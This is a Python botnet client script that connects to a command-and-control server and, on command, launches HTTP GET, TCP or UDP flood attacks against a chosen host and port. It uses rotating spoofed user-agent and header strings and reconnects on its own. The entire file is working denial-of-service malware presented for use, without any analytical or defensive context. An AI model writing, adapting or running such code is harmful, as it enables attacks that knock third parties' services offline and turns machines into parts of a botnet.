#!/usr/bin/env python3
#Code By Leeon123

#-- Python Bot version v1.0 --#

import argparse
import socket
import sys
import os
import time
from multiprocessing import Process
import random
import threading

curProcess = None

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
      "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
      "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
      "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
      "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
      "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

tcpbytes = random._urandom(1024) #For the tcp and udp flood
udpbytes = random._urandom(512)

def CC(ip, port, thread):
    for x in range(100000000):#For a long time flooding
        get_host = "GET / HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        http = get_host + useragent + accept + connection + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(ip), int(port)))
        for y in range(thread):
            s.send(str.encode(http))

def tcpflood(ip, port, thread):
    for x in range(100000000):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(ip),int(port)))
        s.send(tcpbytes)
        for y in range(thread):
            s.send(tcpbytes)
        s.close()

def udpflood(ip, port, thread):
    for x in range(100000000):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sendip=(str(ip),int(port))
        for y in range(thread):
            s.sendto(udpbytes, sendip)
        s.close()

def cmdHandle(sock, parser):#Now you know how does the bot handle the commands from cnc.py
    global curProcess
    while True:
        data = sock.recv(1024).decode()
        if len(data) == 0:
            main()
        if data[0] == '!':
            try:
                options = parser.parse_args(data[1:].split())

                m_host = options.host
                m_port = options.port
                m_thread = options.threads
                m_cmd = options.cmd

                if m_cmd.lower() == 'cc':
                    if curProcess !=None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                    p = Process(target=CC, args = (m_host, m_port, m_thread))
                    p.start()
                    #print("CC Flood Start")
                    curProcess = p
                if m_cmd.lower() == 'tcp':
                    if curProcess !=None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                    p = Process(target=tcpflood, args = (m_host, m_port, m_thread))
                    p.start()
                    #print("TCP Flood Start")
                    curProcess = p
                if m_cmd.lower() == 'udp':
                    if curProcess !=None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                    p = Process(target=udpflood, args = (m_host, m_port, m_thread))
                    p.start()
                    #print("UDP Flood Start")
                    curProcess = p
                elif m_cmd.lower() == 'stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
            except:
                pass

def main():
	p = argparse.ArgumentParser()#Now you know how does the bot handle the commands from cnc.py
	p.add_argument('-H', dest='host', type=str)
	p.add_argument('-p', dest='port',type=int)
	p.add_argument('-t', dest='threads',type=int)
	p.add_argument('-c', dest='cmd', type=str)

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive connection
		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)
		s.connect(('127.0.0.1',1337))#Change your server ip and port

		cmdHandle(s, p)

	except Exception as e:
		connect()

def connect():#for a loop to connect the server until this script break.
	time.sleep(5)
	main()

if __name__ == '__main__':
    main()
